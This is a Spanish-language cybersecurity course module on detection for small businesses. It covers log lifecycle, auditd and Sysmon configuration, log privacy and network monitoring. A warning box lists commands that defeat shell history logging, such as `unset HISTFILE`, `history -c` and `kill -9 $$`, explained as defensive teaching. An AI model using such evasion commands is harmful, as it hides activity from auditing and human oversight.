# 5) Detectar <!-- id: layer-5 -->

# **Módulo 5: Detección y Visibilidad Operativa**

Ningún control preventivo es infalible. Cuando un adversario sortea una barrera —por ejemplo, usando credenciales legítimas robadas— la diferencia entre un incidente contenido y una catástrofe operativa reside en una única capacidad: la visibilidad. Sin monitoreo, una organización puede permanecer ciega durante semanas mientras el atacante explora la red, extrae información y compromete las copias de seguridad.

Pero activar todas las alertas posibles sin criterio genera el problema opuesto: miles de notificaciones irrelevantes que saturan al equipo técnico hasta que las advertencias críticas se ignoran. Este módulo enseña a construir una capacidad de detección proporcional a la madurez de la organización, desde la gestión de registros y el monitoreo de red hasta el triaje estructurado de alertas que abre paso al Módulo 6.

## **¿Qué vas a aprender?**

- Distinguir eventos, alertas e incidentes, y gestionar el ciclo de vida de los registros.
- Monitorear el tráfico de red e identificar intrusiones con las herramientas adecuadas.
- Comprender la visibilidad en endpoints y el monitoreo de integridad de archivos.
- Centralizar datos en un SIEM y diseñar reglas de correlación.
- Aplicar inteligencia de amenazas, indicadores de compromiso y caza proactiva de adversarios.
- Ejecutar un triaje riguroso de alertas y declarar incidentes de forma fundamentada.

## **¿Para quién está pensado?**

Este módulo está dirigido a quienes ya comprenden los controles preventivos de los módulos anteriores y necesitan dar el siguiente paso: operar con visibilidad real. Está estructurado en dos niveles —**Base — IG1** para empresas con recursos limitados y **Avanzado — IG2/IG3** para equipos con infraestructura dedicada— de modo que cada perfil pueda priorizar lo que le resulta más útil sin sentirse desbordado por herramientas que aún no corresponden a su contexto.

:::subindex
title="Índice del módulo"
:::

## 5.1. Básicos de Visibilidad <!-- id: fundamentos-visibilidad-logs, icon: CommandLineIcon -->

Implementar controles de seguridad reduce drásticamente la superficie de exposición de una empresa, pero ninguna barrera preventiva es infalible. Cuando un atacante logra saltear un control inicial —por ejemplo, empleando las credenciales válidas de un empleado obtenidas mediante ingeniería social—, la diferencia entre un incidente contenido a tiempo y una catástrofe operativa reside en una única capacidad: la visibilidad. En la mayoría de las pequeñas empresas, los servidores y estaciones de trabajo operan a ciegas; no registran qué ocurre en su interior o sobrescriben sus historiales cada pocos días, permitiendo que un intruso explore la red durante semanas sin que nadie note su presencia.

Esta subsección establece los cimientos de la etapa de detección: define qué materia prima informativa (_logs_) debemos generar, cómo proteger su integridad desde que nace hasta que se elimina y cómo auditar la infraestructura respetando la privacidad y el secreto de los datos.

### Distinción conceptual y operativa: Evento, Alerta e Incidente

En operaciones de seguridad, los términos evento, alerta e incidente son ampliamente utilizados, por ello es conveniente entender a qué se refieren.

:::group title="Estructura base para detectar amenazas"

- Evento [ocurrencia]: Es cualquier suceso observable y verificable que tiene lugar en un sistema, dispositivo de red o aplicación en un momento determinado. La inmensa mayoría de los eventos son completamente benignos y reflejan la operación normal del negocio: un usuario que inicia sesión por la mañana, una consulta al Sistema de Nombres de Dominio (DNS) para abrir un sitio web, la creación de un proceso en memoria o una tarea programada de copia de seguridad.
- Alerta [señal]: Es una notificación generada de forma automática cuando un evento individual o una secuencia correlacionada de eventos supera un umbral predefinido, coincide con una regla de detección o se desvía de un perfil estadístico de normalidad. Una alerta no confirma por sí misma que exista un ataque; es un llamado de atención técnico que exige validación humana (triaje) para determinar si se trata de una amenaza real o de una actividad legítima inusual (como un administrador realizando mantenimiento nocturno).
- Incidente de seguridad [compromiso confirmado]: Es un evento o serie de eventos adversos verificados que vulneran las políticas de seguridad o comprometen de forma real o inminente la confidencialidad, la integridad o la disponibilidad de los activos. A diferencia de la alerta, el incidente exige activar formalmente los procedimientos de respuesta, contención y recuperación.
  :::

Comprender esta jerarquía transforma la mentalidad del responsable de infraestructura: los sistemas generan millones de **eventos** registrados en archivos de texto; los motores de monitoreo filtran esos eventos para producir decenas de **alertas**; y el análisis técnico depura esas alertas para identificar y escalar los contados **incidentes** verdaderos que requieren intervención.

### Clasificación de la precisión diagnóstica en detección

Cuando un mecanismo de seguridad (como una regla de firewall, un motor EDR o una consulta en el SIEM) evalúa un evento y decide si emitir una alerta o ignorarlo, su eficacia se mide a través de la **matriz de precisión diagnóstica**. En las operaciones de seguridad, los **Falsos Positivos (FP)** generan sobrecarga y fatiga de alertas al forzar al equipo a investigar actividades benignas, el **Falso Negativo (FN) representa el peligro más crítico**, ya que constituye una intrusión o ataque real que evade las defensas en silencio, otorgando al adversario tiempo de permanencia ilimitado (_dwell time_) para comprometer la infraestructura sin oposición.

| Clasificación               | Realidad (Ataque real) | Decisión del sistema (Alerta) | Impacto operativo                                                                                                           |
| :-------------------------- | :--------------------- | :---------------------------- | :-------------------------------------------------------------------------------------------------------------------------- |
| **Verdadero Positivo (TP)** | Sí                     | Sí (Alerta disparada)         | **Detección exitosa:** La amenaza es identificada y permite iniciar el triaje y la respuesta antes de que escale el daño.   |
| **Falso Positivo (FP)**     | No                     | Sí (Falsa alarma)             | **Ruido y sobrecarga:** Genera fatiga de alertas y desperdicio de recursos humanos investigando eventos legítimos.          |
| **Verdadero Negativo (TN)** | No                     | No (Sin alerta)               | **Operación normal:** El sistema filtra correctamente la actividad habitual, permitiendo que el negocio opere sin fricción. |
| **Falso Negativo (FN)**     | Sí                     | No (Sin alerta)               | **Peligro crítico (Brecha oculta):** El ataque pasa completamente inadvertido; es el peor fallo de un sistema defensivo.    |

> [!CRITICAL:La asimetría del riesgo en detección]
> Un **Falso Positivo** cuesta tiempo de análisis; un **Falso Negativo** puede comprometer la continuidad de la organización. La ingeniería de detección busca priorizar la visibilidad para eliminar los falsos negativos, afinando las reglas de forma progresiva para evitar que el ruido operativo colapse al equipo defensor.

### El ciclo de vida del registro (_Log Lifecycle_)

Un registro de auditoría (conocido universalmente como _log_) es la constancia cronológica e inmutable que deja un sistema sobre los eventos que ocurren en él. Para que un registro sirva como herramienta de detección en vivo y como evidencia válida durante una investigación forense, no basta con que el software lo escriba en un archivo local; debe administrarse a través de un ciclo de vida continuo de cuatro etapas.

#### 1. Generación y recolección

La primera etapa consiste en definir qué activos emitirán registros y qué nivel de detalle incluirán. Todo registro de seguridad útil debe ser capaz de responder a las cinco dimensiones básicas de cualquier investigación:

- **Quién (_Who_):** Qué identidad de usuario, cuenta de servicio o proceso ejecutó la acción.
- **Qué (_What_):** Qué operación específica se intentó realizar (inicio de sesión, lectura de archivo, ejecución de comando, cambio de permisos) y cuál fue su resultado (éxito o fallo).
- **Cuándo (_When_):** La marca de tiempo exacta (_timestamp_) en la que ocurrió el evento, idealmente expresada en Tiempo Universal Coordinado (UTC) o con su desplazamiento de zona horaria explícito (estándar ISO 8601) para evitar ambigüedades.
- **Dónde (_Where_):** En qué activo específico (nombre de host, servidor, contenedor o aplicación) se registró la actividad.
- **Origen y Destino (_Source / Destination_):** Desde qué dirección IP, puerto o terminal provino la solicitud y hacia qué recurso iba dirigida.

> [!NOTE:El requisito indispensable de la sincronización horaria]
> Estandarizar la sincronización de tiempo mediante el Protocolo de Tiempo de Red (NTP, _Network Time Protocol_, en el puerto `UDP 123`) contra fuentes confiables es un pilar obligatorio para dar validez cronológica a cualquier registro.

#### 2. Normalización y análisis sintáctico o _Parsing_

En una infraestructura real, cada fabricante escribe sus registros con una estructura diferente: un servidor Linux genera líneas de texto separadas por espacios bajo el estándar Syslog, una aplicación web moderna emite objetos estructurados en formato JSON, y un servidor Microsoft Windows registra eventos en un formato binario propio (EVTX) identificado por códigos numéricos.

Cuando la organización escala y centraliza sus registros, entra en juego el proceso de **análisis sintáctico (_parsing_) y normalización**: el sistema recolector descompone cada línea cruda para extraer sus valores y los traduce a un diccionario de nombres de campos unificado (por ejemplo, convirtiendo `src_ip`, `ClientIP` y `IpAddress` en un único campo estándar llamado `source.ip`). Esto permite buscar una dirección sospechosa en toda la empresa con una sola consulta, sin importar qué tipo de equipo generó el dato.

#### 3. Almacenamiento, rotación y retención

Los archivos de registro crecen de manera ininterrumpida. Si un servidor web o un controlador de dominio sufre un ataque de fuerza bruta que genera miles de eventos por minuto y no cuenta con límites de almacenamiento, la partición del disco se llenará al 100%, provocando la caída del sistema operativo o deteniendo la escritura de nuevos _logs_.

Para evitar esta denegación de servicio autoinfligida y cumplir a la vez con los plazos de investigación, la arquitectura aplica dos mecanismos:

- **Rotación automática de registros:** Utilidades nativas como `logrotate` en sistemas Linux comprimen periódicamente los archivos de registro antiguos (por ejemplo, a diario o cuando superan un tamaño determinado en megabytes), crean un archivo nuevo limpio y eliminan los archivos comprimidos más viejos una vez cumplido el ciclo.
- **Política de retención mínima:** Dado que una PyME puede tardar semanas o meses en notar una intrusión silenciosa, conservar únicamente los registros de las últimas 48 horas impide saber cómo ingresó el atacante. Mientras que en un nivel inicial de seguridad (IG1) se asegura el espacio en disco disponible, en un nivel más consolidado (IG2+) se establece una retención mínima de **90 días** en almacenamiento activo o archivado.

```bash:terminal
# Inspeccionar la política de rotación general en un servidor Debian/Ubuntu
cat /etc/logrotate.conf | grep -E "weekly|rotate|compress"
```

El comando anterior permite verificar cuántas semanas o ciclos se conservan localmente los archivos antes de ser sobrescritos y si se aplica compresión para optimizar el espacio en disco.

#### 4. Control de acceso e integridad del registro

Desde la perspectiva de un atacante que ha logrado obtener privilegios de administrador (`root` o `SYSTEM`) en un servidor, su prioridad inmediata después de asegurar su acceso es borrar las huellas de su intrusión (táctica catalogada en MITRE ATT&CK bajo la técnica `T1070`: _Indicator Removal_). Si los registros residen únicamente en el disco local del equipo vulnerado con permisos de escritura normales, el intruso simplemente podrá editar o vaciar los archivos en `/var/log/` o ejecutar el borrado del visor de eventos.

Para garantizar la integridad de la evidencia se aplican dos barreras complementarias:

1. **Atributos locales de solo anexado:** En sistemas de archivos Linux (`ext4` / `xfs`), los archivos de _logs_ críticos pueden protegerse aplicando el atributo de "solo anexado" (_append-only_), el cual permite que el sistema agregue nuevas líneas al final del archivo pero impide que se modifiquen o borren las líneas existentes sin retirar antes explícitamente el atributo:

```bash:terminal
# Aplicar atributo append-only (+a) a un archivo de registro crítico y verificarlo
sudo chattr +a /var/log/auth.log
lsattr /var/log/auth.log
```

2. **Reenvío en tiempo real hacia un colector aislado (Avanzado):** Frente a un administrador local comprometido, la única garantía real es transmitir cada línea de registro en el instante mismo en que se genera (mediante protocolos como `rsyslog` sobre TLS en el puerto `TCP 6514` o agentes ligeros) hacia un servidor recolector en otra zona de la red. En este esquema, el origen solo cuenta con permisos para añadir nuevos eventos, sin acceso para leer, modificar o borrar lo ya almacenado.

### Fuentes de telemetría y por qué el historial de consola no es auditoría

Para construir una visibilidad efectiva sin saturar la infraestructura, el administrador debe conocer dónde residen las fuentes primarias de telemetría del sistema operativo y de las aplicaciones.

> [!NOTE:¿Qué es la telemetría?]
> La telemetría en ciberseguridad se refiere a la recopilación y el envío automático de datos sobre lo que ocurre dentro de los sistemas, redes y dispositivos de una organización. Esta información se analiza en tiempo real para detectar comportamientos anómalos, detener amenazas y mejorar las defensas.

#### Principales fuentes de registros en sistemas y red

```filetree:Rutas_Criticas_de_Logs_Linux
/var/log/
├── auth.log (o /var/log/secure)  # Autenticaciones SSH, uso de sudo, creación de usuarios y sesiones PAM (permisos elevados)
├── syslog (o /var/log/messages)  # Eventos generales del sistema operativo, daemons y servicios de red
├── kern.log                      # Mensajes del núcleo (kernel), fallos de memoria y bloqueos de firewall (UFW/nftables)
├── nginx/ o apache2/             # Registros de aplicaciones web publicadas
│   ├── access.log                # Cada petición HTTP recibida (IP, ruta, código de estado, User-Agent)
│   └── error.log                 # Fallos de ejecución, errores de configuración o intentos de explotación
└── audit/
    └── audit.log                 # Registros inmutables del subsistema de auditoría del kernel (auditd)

```

En entornos basados en **Microsoft Windows Server y estaciones Windows**, esta misma telemetría se organiza de forma nativa dentro del Visor de Eventos (_Event Viewer_) en canales específicos, destacándose el canal **Security** (donde se registran eventos fundamentales como el `Event ID 4624` para inicios de sesión exitosos, `4625` para intentos de inicio de sesión fallidos, `4672` para asignación de privilegios administrativos especiales y `4720` para la creación de nuevas cuentas de usuario), junto con los canales **System** y **Application**.

> [!WARNING:Limitaciones de .bash_history como registro de auditoría]
> El historial de la terminal (`~/.bash_history` o `~/.zsh_history`) es una función de comodidad para el usuario, no un control de seguridad. Dado que el archivo reside en el directorio personal, pertenece al propio usuario y solo se vuelca a disco al cerrar la sesión, y resulta fácil de evadir o alterar. Un usuario o atacante puede omitir el registro anteponiendo un espacio al comando, deshabilitarlo en memoria (`unset HISTFILE`, `HISTSIZE=0`, `history -c`), cerrar la sesión abruptamente (`kill -9 $$`) o editar el archivo directamente. Además, por defecto carece de contexto forense esencial como _timestamps_ confiables o distinción entre sesiones simultáneas.

#### Cómo implementar auditoría real de línea de comandos (IG2)

Para cumplir con la auditoría real de línea de comandos y procesos, la captura de _logs_ debe realizarse a nivel del **núcleo del sistema operativo (_kernel_)** o de los subsistemas profundos de ejecución, fuera del control de la consola del usuario:

- **En entornos Linux (`auditd` — _Linux Audit Daemon_):** El demonio `auditd` intercepta directamente las llamadas al sistema (_system calls_) dentro del núcleo del sistema operativo. Cuando cualquier usuario o proceso ejecuta un binario o script, el kernel registra en `/var/log/audit/audit.log` el comando exacto con todos sus argumentos, el directorio de trabajo, el identificador del usuario original que inició la sesión (`auid`, que se mantiene intacto incluso si la persona luego escaló a `root` con `sudo` o `su`) y el identificador del usuario efectivo (`uid`). Aunque el atacante ejecute `unset HISTFILE`, la llamada al sistema queda grabada inmediatamente.

:::steps

### 1. Instalación y verificación del demonio auditd

En un servidor basado en Debian o Ubuntu (requiere permisos de superusuario), instala el paquete oficial de auditoría del kernel y comprueba que el servicio se encuentre activo:

```bash:terminal
sudo apt update && sudo apt install -y auditd audispd-plugins
sudo systemctl status auditd
```

El servicio debe mostrarse como `active (running)`.

### 2. Configuración de una regla persistente para auditar ejecuciones

Crea un archivo de reglas estándar en `/etc/audit/rules.d/50-execve.rules` para registrar toda llamada al sistema `execve` (ejecución de programas en arquitecturas de 64 y 32 bits), etiquetándola con la clave `exec`.

```bash:terminal
sudo tee /etc/audit/rules.d/50-execve.rules << 'EOF'
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec
EOF
sudo augenrules --load
```

Resultado esperado: `augenrules` compilará las reglas dentro de `/etc/audit/audit.rules` y las cargará en el kernel sin devolver errores de sintaxis.

### 3. Búsqueda y verificación de comandos ejecutados

Ejecuta cualquier comando de prueba y luego utiliza la herramienta nativa `ausearch` filtrando por la clave `exec` con el modificador `-i` para interpretar los identificadores numéricos a nombres legibles:

```bash:terminal
sudo ausearch -k exec -i | tail -n 20
```

Verás el registro exacto con la marca de tiempo, el comando completo (`proctitle`), la ruta del binario ejecutado, el usuario original de inicio de sesión (`auid`) y el resultado de la ejecución, independientemente de lo que ocurra con `.bash_history`.

:::

- **En entornos Windows:** A diferencia de Linux, Windows utiliza el Visor de Eventos nativo, pero por defecto no registra qué comandos exactos ejecuta un usuario en la terminal. Para obtener visibilidad real, se deben activar tres componentes clave mediante comandos (ejecutados en una consola PowerShell como Administrador):

:::steps

### 1. Activar auditoría de procesos con línea de comandos

Primero, se habilita la política para que Windows registre cada vez que se crea un proceso (`Event ID 4688`). Luego, se modifica el registro del sistema para forzar la inclusión del texto exacto que el usuario ingresó (parámetros y argumentos):

```powershell:terminal
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

### 2. Habilitar el registro de scripts en PowerShell

Este control (_Script Block Logging_ — `Event ID 4104`) es vital porque captura el código directamente desde la memoria. Aunque el atacante encripte u ofusque sus comandos en Base64, el sistema registrará el texto limpio justo antes de su ejecución:

```powershell:terminal
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
```

### 3. Instalar Sysmon (System Monitor)

Sysmon es una utilidad oficial de Microsoft Sysinternals que amplía enormemente los registros. Captura las creaciones de procesos con su firma criptográfica o _hash_ (`Event ID 1`), qué proceso específico abrió una conexión de red (`Event ID 3`) y qué consultas DNS se realizaron (`Event ID 22`). Su instalación requiere descargar el ejecutable oficial y aplicar un archivo de configuración `.xml` (como las plantillas estándar de la comunidad):

```powershell:terminal
# Se ejecuta en el directorio donde se descargó Sysmon y su configuración
.\Sysmon64.exe -accepteula -i config.xml
```

:::

### Privacidad, minimización de datos y protección de secretos en los registros

Un error grave al configurar _logs_ detallados de aplicaciones o servidores web consiste en transformar el propio sistema de logs en una fuente de filtración de datos. Si los registros capturan sin filtro todo lo que ingresa por un formulario o una API, información altamente confidencial terminará escrita en texto plano dentro de archivos de registro a los que tienen acceso desarrolladores, personal de soporte o proveedores externos.

#### Riesgos críticos de exposición en los archivos de registro

Al diseñar qué campos se guardarán en las trazas de sistemas y aplicaciones propias de la empresa, se debe evitar estrictamente registrar cuatro tipos de datos:

- **Contraseñas tipeadas por error en el campo de usuario:** Es sumamente frecuente que un empleado distraído escriba su contraseña en la casilla de "Nombre de usuario", presione la tecla Enter y falle el inicio de sesión. Si el sistema registra textualmente _"Fallo de autenticación para el usuario: MiClaveSecreta123!"_, cualquier administrador que revise `/var/log/auth.log` o el colector central verá la contraseña real del empleado junto a su intento exitoso un segundo después.
- **Secretos técnicos, tokens de sesión y claves API:** Si un servidor web registra las cabeceras HTTP completas y cookies de sesión o si una aplicación envía tokens de recuperación de contraseña como parámetros dentro de la dirección URL, esos secretos quedarán expuestos en `access.log`, permitiendo que cualquiera con permiso de lectura sobre los registros secuestre las sesiones activas de los usuarios.
- **Información de Identificación Personal (PII) y datos financieros:** Registrar el cuerpo completo (_payload_) de las peticiones `POST` en una tienda en línea o sistema administrativo puede volcar números completos de tarjetas de crédito, documentos de identidad, domicilios o diagnósticos médicos en archivos de texto sin cifrar, violando normativas de protección de datos personales y estándares como PCI-DSS.

> [!TIP:Principios de minimización y sanitización de logs]
> Aplica siempre el principio de **minimización de datos** al configurar el nivel de detalle (_verbosity_) en producción: los niveles `DEBUG` o `TRACE` (que vuelcan variables internas y memoria completa) solo deben activarse temporalmente en entornos de desarrollo con datos ficticios, nunca en producción. En producción, las aplicaciones deben aplicar funciones de **enmascaramiento (_masking_) o sanitización** antes de escribir el registro (por ejemplo, registrando únicamente los últimos 4 caracteres de un token o tarjeta `****-****-****-1234`, y reemplazando el nombre de un usuario inexistente por un identificador genérico `[USUARIO_INVALIDO]` en los fallos de inicio de sesión).

Asimismo, desde el punto de vista legal y organizacional, la implementación de registros que monitorean la actividad de los empleados (como las consultas DNS o solicitudes de direcciones URL en niveles avanzados) debe estar respaldada por una **Política de Uso Aceptable (AUP)** comunicada y firmada previamente por el personal, informando de manera transparente que los equipos y redes corporativas son auditados exclusivamente con fines de seguridad operativa y protección de activos.

### Del nivel básico de visibilidad al nivel Avanzado

Una pequeña organización no debe intentar desplegar todas las capacidades de auditoría el mismo día. La siguiente tabla estructura la hoja de ruta de visibilidad separando los cimientos obligatorios (**CIS IG1**) de las capacidades de madurez intermedia y avanzada (**CIS IG2 e IG3**):

| Nivel de Madurez                                                                                    | Práctica de Visibilidad y Gestión de Registros                                                                                                                                                    | Problema operativo que resuelve                                                                                                 |
| --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Base obligatoria — IG1                                                                              | **Proceso básico y recolección local de logs:** Definir qué activos críticos generan registros, activarlos localmente y asignar un responsable de su cuidado.                                     | Evita que ante un incidente o fallo técnico el servidor tenga las bitácoras desactivadas de fábrica.                            |
| Base obligatoria — IG1                                                                              | **Dimensionamiento de almacenamiento y rotación:** Configurar cuotas de disco y rotación automática (`logrotate` / tamaño máximo de EVTX) en cada activo.                                         | Previene que el llenado de los archivos de registro bloquee el sistema operativo o sobrescriba evidencias del mismo día.        |
| Base recomendada                                                                                    | **Sanitización y privacidad en logs:** Excluir contraseñas, tokens de sesión y datos personales en texto plano de las trazas de producción.                                                       | Impide que los archivos de registro se conviertan en un repositorio de credenciales robables.                                   |
| **Avanzado** _(Estructuración — IG2)_                                                               | **Sincronización horaria estandarizada (`NTP`):** Configurar al menos dos fuentes de tiempo confiables en todos los activos empresariales.                                                        | Permite correlacionar eventos entre distintos servidores y firewalls con precisión de milisegundos.                             |
| **Avanzado** _(Estructuración — IG2)_                                                               | **Registros detallados, DNS, URL y línea de comandos real:** Activar auditoría profunda de cuentas, consultas DNS, peticiones web y ejecución en kernel (`auditd` / `Sysmon`).                    | Descubrir qué ejecutó realmente un atacante aunque borre `.bash_history`, y detectar conexiones hacia dominios de malware.      |
| **Avanzado** _(Estructuración — IG2)_                                                               | **Retención mínima de 90 días y revisiones periódicas:** Conservar registros durante al menos tres meses y establecer una rutina formal (semanal o mensual) de revisión de anomalías.             | Permite investigar intrusiones descubiertas tardíamente y asegura que los logs no se recolecten en vano sin que nadie los mire. |
| **Avanzado** _(Defensa madura — IG3)_                                                               | **Auditoría de acceso a datos sensibles y logs de proveedores:** Registrar cada lectura/modificación de archivos confidenciales y recolectar bitácoras de plataformas en la nube (`SaaS`/`IaaS`). | Detecta exfiltración silenciosa de bases de datos internas o compromisos originados en servicios administrados por terceros.    |
| _Escalonamiento de controles de visibilidad desde la higiene esencial hasta la auditoría avanzada._ |                                                                                                                                                                                                   |                                                                                                                                 |

### Verificación de la base de visibilidad

Para confirmar que los fundamentos de esta sección están correctamente aplicados en un servidor o estación de trabajo antes de pasar al monitoreo de tráfico de red (`05.2`), ejecuta la siguiente secuencia de verificación:

:::steps

### 1. Comprobación de generación activa de eventos de autenticación

Verifica que el sistema esté escribiendo eventos en tiempo real al producirse una elevación de privilegios o inicio de sesión, y comprueba que sus permisos impidan la lectura por parte de usuarios sin privilegios:

```bash:terminal
sudo ls -la /var/log/auth.log
sudo tail -n 5 /var/log/auth.log
```

Resultado esperado: el archivo debe tener tamaño mayor a cero, pertenecer al usuario `root` o `syslog` con grupo `adm` (permisos `0640`, nunca `0644` ni `0777` que permitirían a cualquier usuario leer o alterar el log) y mostrar en la última línea la ejecución misma del comando `sudo` que acabas de correr con la fecha y hora exactas.

### 2. Verificación del estado de sincronización horaria

Comprueba que el reloj del sistema esté sincronizado activamente contra un servidor de tiempo mediante la utilidad nativa `timedatectl`:

```bash:terminal
timedatectl status
```

Resultado esperado: la línea `System clock synchronized:` debe indicar explícitamente `yes` y el servicio `NTP service:` debe figurar como `active`. Si figura como `no`, las marcas de tiempo de este equipo no serán confiables durante un incidente.

### 3. Auditoría rápida de no exposición de secretos en logs web (buena práctica)

Si el servidor aloja una aplicación web o API, realiza una búsqueda rápida mediante expresiones regulares (_regex_) en los _logs_ de acceso para verificar que no se estén guardando tokens, claves o contraseñas como parámetros en texto claro dentro de las direcciones URL.

```bash:terminal
sudo grep -iE "(password=|passwd=|token=|apikey=|secret=)" /var/log/nginx/access.log
```

Resultado esperado: el comando no debe devolver ninguna coincidencia. Si devuelve líneas con credenciales visibles, la aplicación debe modificarse para enviar esos datos en el cuerpo cifrado de una petición `POST` y filtrarlos antes de registrar la traza.
:::

## 5.2. Monitoreo de Red <!-- id: monitoreo-red, icon: NetworkIcon, displayTitle: 05.2 — Monitoreo de Red, description: Fundamentos conceptuales del monitoreo de tráfico de red, enfoques de observación, arquitectura del sensor, limitaciones del cifrado y consideraciones prácticas para PyMEs. -->

La sección anterior estableció los cimientos de la visibilidad interna: registrar y proteger lo que ocurre _dentro_ de cada sistema. Esta sección extiende esa visibilidad hacia la infraestructura de comunicaciones que conecta todos esos sistemas entre sí y con el exterior. Cuando un atacante utiliza credenciales robadas para ingresar a la red corporativa, o cuando un código malicioso logra ejecutarse desde un correo electrónico, la intrusión deja de ser un problema de un solo equipo y se convierte en un problema de red. La diferencia entre contenerla a tiempo o descubrirla semanas después depende, en gran medida, de lo que seamos capaces de observar en el tráfico que circula entre los dispositivos.

Esta sección cubre exclusivamente los conceptos, enfoques y herramientas de monitoreo de red.

### Fundamentos del Monitoreo de Red

#### ¿Por qué monitorear el tráfico de red?

Cuando dos dispositivos se comunican, intercambian información mediante paquetes de red. Estos paquetes contienen datos sobre quién envía la información, quién la recibe, qué protocolo utiliza y, dependiendo de las condiciones de la comunicación, también el contenido transmitido. Observar estas comunicaciones **en conjunto** permite detectar comportamientos que no necesariamente resultan evidentes al mirar cada equipo por separado. Por ejemplo:

- Una computadora que establece conexiones repetitivas cada pocos minutos con un servidor desconocido en Internet.
- Un equipo de oficina que intenta conectarse a cientos de dispositivos de la red local en pocos segundos.
- Un servidor interno que comienza a transferir grandes cantidades de información hacia el exterior durante la madrugada.
- Un dispositivo que establece conexiones hacia servicios o puertos que normalmente nunca utiliza.

Estas situaciones no demuestran automáticamente que exista un ataque, pero representan comportamientos anómalos que merecen investigarse.

#### ¿Por qué no alcanza con revisar los registros de cada equipo?

Los registros locales de cada sistema operativo o aplicación son fundamentales, pero tienen una debilidad estructural: si un atacante compromete una máquina y se mueve lateralmente a otra, realizando acciones aisladas en diferentes endpoints, el equipo de seguridad tendría que revisar _logs_ en cada máquina de forma individual. La observación de red proporciona una fuente independiente de visibilidad, ya que registra las comunicaciones desde los equipos de interconexión (como un _switch_ o un sensor dedicado), fuera del alcance directo del dispositivo comprometido.

La clave en una pequeña o mediana empresa consiste en combinar los registros de los equipos con la observación de la red para obtener una imagen completa de los eventos.

#### Direcciones del tráfico a observar

Como vimos anteriormente, existen dos "direcciones principales" de tráfico:

:::group title="Direcciones del tráfico a observar"

- Tráfico Norte-Sur [Perimetral]: Comunicaciones que entran o salen de la organización, generalmente entre la red interna e Internet. Permite vigilar si un equipo interno se comunica con servidores de atacantes externos o si alguien intenta vulnerar un servicio publicado.
- Tráfico Este-Oeste [Interno / Lateral]: Comunicaciones horizontales entre dispositivos, servidores o diferentes subredes (VLAN) dentro de la propia empresa. Es indispensable para detectar el movimiento lateral cuando un intruso intenta saltar desde una computadora infectada hacia el servidor principal.
  :::

Muchas organizaciones pequeñas solo monitorizan el tráfico Norte-Sur (lo que entra y sale por el _firewall_ perimetral) y pasan por alto el tráfico Este-Oeste. Esta es una omisión costosa: una vez que un atacante está dentro de la red, todo su movimiento posterior ocurre en el eje interno. Una solución de monitoreo que solo mira el perímetro no detectará ese desplazamiento hasta que sea demasiado tarde.

### Enfoques de Observación de Red

Con la motivación clara, el siguiente paso es entender qué clase de datos puede recolectar un sistema de monitoreo de red. No todas las técnicas guardan la misma cantidad de información. En una pequeña organización con espacio de disco limitado, distinguir los tres enfoques principales es fundamental para elegir cuál aplicar en cada situación.

#### 1. Análisis de flujos de red (_NetFlow_ / IPFIX)

Un flujo de red representa el resumen estadístico de una conversación entre dos equipos. En lugar de guardar el contenido de cada paquete enviado, el router o cortafuegos anota únicamente una ficha resumen de la sesión: quién se comunicó con quién, por qué puerto, durante cuánto tiempo y cuántos bytes intercambiaron.

| Campo registrado                                                                                           | Ejemplo de valor                    | Utilidad para el análisis                                              |
| :--------------------------------------------------------------------------------------------------------- | :---------------------------------- | :--------------------------------------------------------------------- |
| **IP de origen**                                                                                           | `10.10.30.20`                       | Identifica al servidor contable interno que inició la conexión.        |
| **IP de destino**                                                                                          | `203.0.113.15`                      | Muestra la dirección pública externa con la que habló.                 |
| **Puerto y Protocolo**                                                                                     | `TCP 443`                           | Indica una comunicación web cifrada estándar.                          |
| **Duración**                                                                                               | `120 segundos`                      | Tiempo total que duró la sesión abierta.                               |
| **Bytes enviados vs. recibidos**                                                                           | `18 GB` enviados / `4 MB` recibidos | Alerta sobre una transferencia masiva e inusual de datos hacia afuera. |
| _Ejemplo de registro de flujo de red evidenciando una posible exfiltración de datos durante la madrugada._ |                                     |                                                                        |

- **Ventaja:** Consume muy poco espacio de almacenamiento en disco, permitiendo guardar historial de meses para conocer el comportamiento normal de la empresa.
- **Limitación:** No guarda el contenido de los paquetes; sabemos que enviaron 18 GB, pero el flujo no dice qué archivos eran.

#### 2. Captura completa de paquetes (PCAP)

Una captura completa graba exactamente cada paquete que circula por la interfaz de red, incluyendo todos sus encabezados técnicos y el contenido transmitido (siempre que no esté cifrado). El resultado se guarda en archivos con extensión `.pcap` o `.pcapng`.

- **Ventaja:** Ofrece el máximo nivel de detalle posible para investigar un incidente puntual y reconstruir paso a paso qué ocurrió en una comunicación sospechosa.
- **Limitación:** Consume mucho espacio en disco y puede almacenar información privada o contraseñas en texto claro, por lo que suele utilizarse para diagnósticos puntuales y no para grabar toda la red 24/7.

#### 3. Detección y prevención de intrusiones de red (NIDS / NIPS)

A diferencia de los métodos anteriores que solo registran datos, estos sistemas analizan el tráfico en vivo buscando patrones de ataques conocidos (firmas) o comportamientos anormales en los protocolos para alertar al equipo técnico:

- **NIDS (Sistema de Detección de Intrusiones de Red):** Funciona de manera pasiva. Recibe una copia del tráfico, la analiza y genera una alerta cuando detecta algo sospechoso (como un escaneo de puertos), sin interrumpir ni frenar la comunicación original.
- **NIPS (Sistema de Prevención de Intrusiones de Red):** Se coloca en medio del flujo del tráfico. Además de generar la alerta, tiene la capacidad de bloquear y descartar los paquetes maliciosos en tiempo real para cortar el ataque.

| Método                                                                    | ¿Qué registra principalmente?             | ¿Para qué se utiliza en una PyME?                                            |
| :------------------------------------------------------------------------ | :---------------------------------------- | :--------------------------------------------------------------------------- |
| **NetFlow / IPFIX**                                                       | Metadatos y estadísticas de las sesiones. | Identificar patrones horarios, consumos anómalos y salidas masivas de datos. |
| **Captura PCAP**                                                          | Paquetes de red completos.                | Diagnosticar problemas puntuales e investigar incidentes en detalle.         |
| **NIDS / NIPS**                                                           | Eventos y alertas de seguridad.           | Detectar en tiempo real (o bloquear) actividades maliciosas conocidas.       |
| _Comparación de los tres enfoques complementarios de observación de red._ |                                           |                                                                              |

